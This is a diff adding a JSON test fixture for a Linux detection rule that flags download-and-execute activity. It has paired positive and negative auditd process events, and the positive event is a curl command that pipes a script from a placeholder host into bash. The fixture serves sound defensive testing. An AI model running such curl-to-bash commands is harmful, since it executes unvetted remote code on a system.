@@ -1,0 +1,21 @@
+{
+  "rule_id": "fusion-linux-download-execute",
+  "positive": {
+    "platform": "linux",
+    "source_type": "linux_auditd",
+    "host_name": "ubuntu-detection-lab",
+    "event_action": "process_execute",
+    "process_name": "curl",
+    "process_path": "/usr/bin/curl",
+    "command_line": "/usr/bin/curl -fsSL https://lab.invalid/bootstrap | bash"
+  },
+  "negative": {
+    "platform": "linux",
+    "source_type": "linux_auditd",
+    "host_name": "ubuntu-detection-lab",
+    "event_action": "process_execute",
+    "process_name": "curl",
+    "process_path": "/usr/bin/curl",
+    "command_line": "/usr/bin/curl https://example.com"
+  }
+}
